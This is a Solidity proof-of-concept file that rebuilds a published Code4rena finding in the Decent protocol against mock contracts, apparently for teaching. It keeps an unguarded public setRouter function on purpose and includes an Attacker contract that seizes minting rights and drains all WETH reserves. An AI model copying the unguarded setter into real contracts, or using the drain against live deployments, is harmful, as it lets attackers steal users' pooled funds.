// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Decent — [H-01] Anyone can update the Router address in DcntEth
    (Code4rena 2024-01-decent; #30559)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: DcntEth.setRouter is public with no access control, so any
    address can become onlyRouter and mint/burn DcntEth freely. Free-minted
    DcntEth is redeemable 1:1 for the WETH reserves held by DecentEthRouter
    (redeemWeth). Vulnerable setRouter preserved verbatim (@>). */

contract MockWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Reduced DcntEth — OFT mint/burn surface with the vulnerable setRouter.
contract DcntEth {
    string public name = "Decent Eth";
    string public symbol = "DcntEth";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public router;

    modifier onlyRouter() {
        require(msg.sender == router);
        _;
    }

    /**
     * @param _router the decentEthRouter associated with this eth
     */
    function setRouter(address _router) public {
        router = _router; // @> VULN: no access control — anyone can become the router and mint/burn
        // FIX: onlyOwner modifier on setRouter
    }

    function mint(address _to, uint256 _amount) public onlyRouter {
        balanceOf[_to] += _amount;
    }

    function burn(address _from, uint256 _amount) public onlyRouter {
        require(balanceOf[_from] >= _amount, "burn");
        balanceOf[_from] -= _amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Reduced DecentEthRouter — liquidity + redeem path that pays WETH for DcntEth.
contract DecentEthRouter {
    MockWETH public weth;
    DcntEth public dcntEth;
    mapping(address => uint256) public balanceOf;

    constructor(address payable _wethAddress, address _dcntEth) {
        weth = MockWETH(_wethAddress);
        dcntEth = DcntEth(_dcntEth);
    }

    function addLiquidityWeth(uint256 amount) public {
        balanceOf[msg.sender] += amount;
        weth.transferFrom(msg.sender, address(this), amount);
        dcntEth.mint(address(this), amount);
    }

    function redeemWeth(uint256 amount) public {
        dcntEth.transferFrom(msg.sender, address(this), amount);
        weth.transfer(msg.sender, amount);
    }
}

contract Attacker {
    function hijackAndDrain(DcntEth dcnt, DecentEthRouter router, uint256 amount) external {
        // Become the onlyRouter.
        dcnt.setRouter(address(this));
        // Mint unbacked DcntEth equal to the vault reserves.
        dcnt.mint(address(this), amount);
        dcnt.approve(address(router), amount);
        // Redeem 1:1 against real WETH liquidity.
        router.redeemWeth(amount);
    }
}

contract Exploit {
    MockWETH public weth; // CREATE nonce 1
    DcntEth public dcnt; // CREATE nonce 2 — vulnerable
    DecentEthRouter public router; // CREATE nonce 3
    Attacker public attacker; // CREATE nonce 4

    uint256 public constant LP_AMOUNT = 100 ether;

    constructor() {
        weth = new MockWETH();
        dcnt = new DcntEth();
        router = new DecentEthRouter(payable(address(weth)), address(dcnt));
        // Legitimate setup: router is the authorized minter.
        dcnt.setRouter(address(router));
        attacker = new Attacker();

        // LP deposits 100 WETH of reserves (via this contract as depositor).
        weth.mint(address(this), LP_AMOUNT);
        weth.approve(address(router), LP_AMOUNT);
        router.addLiquidityWeth(LP_AMOUNT);
    }

    function run() external {
        require(weth.balanceOf(address(router)) == LP_AMOUNT, "reserves");
        require(weth.balanceOf(address(attacker)) == 0, "attacker empty");
        require(dcnt.router() == address(router), "router set");

        // Permissionless hijack + drain.
        attacker.hijackAndDrain(dcnt, router, LP_AMOUNT);

        // Harm: attacker holds all 100 WETH; router is empty; attacker is the router.
        require(dcnt.router() == address(attacker), "hijacked");
        require(weth.balanceOf(address(attacker)) == LP_AMOUNT, "drained");
        require(weth.balanceOf(address(router)) == 0, "router empty");
    }
}
